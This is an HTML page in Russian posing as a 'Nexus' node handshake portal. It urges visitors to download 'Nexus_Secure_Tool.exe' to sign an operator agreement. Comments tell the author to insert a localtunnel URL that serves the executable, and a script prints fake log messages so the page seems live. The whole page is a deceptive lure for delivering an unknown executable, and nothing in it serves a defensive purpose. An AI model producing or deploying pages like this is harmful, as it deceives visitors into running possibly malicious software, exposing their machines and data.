<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Sync Portal</title>
    <!-- Подключаем стили, чтобы всё было красиво сразу -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#0d1117] text-[#c9d1d9] font-sans flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full bg-[#161b22] border border-[#30363d] rounded-2xl p-8 shadow-2xl text-center">
        <!-- Анимированный статус -->
        <div class="flex justify-center mb-6">
            <div class="relative flex h-12 w-12">
                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                <span class="relative inline-flex rounded-full h-12 w-12 bg-blue-600 flex items-center justify-center">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                </span>
            </div>
        </div>

        <h1 class="text-2xl font-bold text-white mb-2">Nexus Node Handshake</h1>
        <p class="text-sm text-gray-400 mb-8">
            Для активации календаря и подписи документов <b>Operator_Agreement.pdf</b> необходимо установить крипто-модуль верификации.
        </p>

        <!-- КНОПКА СКАЧИВАНИЯ -->
        <!-- ЗАМЕНИ 'ССЫЛКА_ОТ_LOCAL_TUNNEL' на ту, что выдал тебе терминал (например: https://lazy-cats-run.loca.lt) -->
        <a href="ССЫЛКА_ОТ_LOCAL_TUNNEL/download/Nexus_Secure_Tool.exe" 
           class="block w-full py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold transition-all shadow-lg shadow-blue-900/30">
            СКАЧАТЬ И ПОДПИСАТЬ
        </a>

        <div class="mt-6 pt-6 border-t border-[#30363d]">
            <div id="logs" class="font-mono text-[10px] text-gray-500 space-y-1 text-left h-12 overflow-hidden">
                <div>[system] waiting for handshake...</div>
            </div>
        </div>
    </div>

    <script>
        // Скрипт, который будет добавлять строчки в лог, чтобы всё выглядело "живым"
        const logs = document.getElementById('logs');
        const msgs = ["[net] check peers...", "[auth] sign requested", "[sync] layer 7 ready"];
        setInterval(() => {
            const div = document.createElement('div');
            div.innerHTML = "> " + msgs[Math.floor(Math.random() * msgs.length)];
            logs.appendChild(div);
            if (logs.childNodes.length > 3) logs.removeChild(logs.firstChild);
        }, 2000);
    </script>
</body>
</html>
